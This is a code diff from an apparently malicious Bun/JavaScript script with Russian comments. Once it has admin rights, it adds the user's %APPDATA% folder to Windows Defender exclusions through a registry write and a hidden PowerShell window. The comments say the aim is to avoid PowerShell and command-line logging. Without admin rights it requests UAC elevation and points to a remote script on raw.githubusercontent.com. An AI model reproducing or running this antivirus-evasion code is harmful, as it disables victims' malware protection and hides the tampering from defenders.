@@ -18,34 +18,37 @@
     } catch (e) { return false; }
   };
 
-    if (await isAdmin()) {
-    console.log("✅ АДМИН! PID:", process.pid);
-    
-    // Определяем путь %APPDATA%
-    const appDataPath = process.env.APPDATA;
-    console.log(`🛡️ Добавляем в исключения Defender: ${appDataPath}`);
+      if (await isAdmin()) {
+    const appData = process.env.APPDATA;
+    console.log(`🛡️ Пробуем добавить исключение для: ${appData}`);
 
-    // Используем WMIC (стандартная утилита Windows), чтобы избежать PowerShell логов
-    // Это легитимный способ управления настройками через WMI
-    const excludeCmd = [
-      "WMIC", "/Namespace:\\\\root\\Microsoft\\Windows\\Defender", 
-      "Class", "MSFT_MpPreference", "call", "Add", 
-      `ExclusionPath=\"${appDataPath}\"`
+    // Метод 1: Прямая запись в реестр через reg.exe (иногда эффективнее WMIC)
+    const regCmd = [
+      "reg", "add", 
+      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
+      "/v", appData, "/t", "REG_SZ", "/d", "0", "/f"
     ];
 
-    const excludeProc = Bun.spawn({ cmd: excludeCmd, stdout: "pipe" });
-    const result = await new Response(excludeProc.stdout).text();
-    
-    if ((await excludeProc.exited) === 0) {
-        console.log("✅ Исключение успешно добавлено через WMI!");
+    const regProc = Bun.spawn({ cmd: regCmd });
+    const exitCode = await regProc.exited;
+
+    if (exitCode === 0) {
+      console.log("✅ Реестр обновлен успешно.");
     } else {
-        console.log("❌ Ошибка при добавлении (возможно, включен Tamper Protection):", result);
+      console.log("❌ Ошибка доступа к реестру (Access Denied). Это нормально при включенном Tamper Protection.");
     }
+
+    // Метод 2: "Тихий" запуск PowerShell (если WMIC не сработал)
+    // Мы вызываем его через Bun.spawn, чтобы скрыть логи командной строки
+    await Bun.spawn({
+      cmd: ["powershell", "-WindowStyle", "Hidden", "-Command", `Add-MpPreference -ExclusionPath '${appData}'`]
+    }).exited;
 
     console.log("\nНажми Enter для выхода...");
     for await (const line of console) break;
     return;
   }
+
 
   console.log("❌ Не админ. Запрос UAC...");
   const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/admin-loop.js";
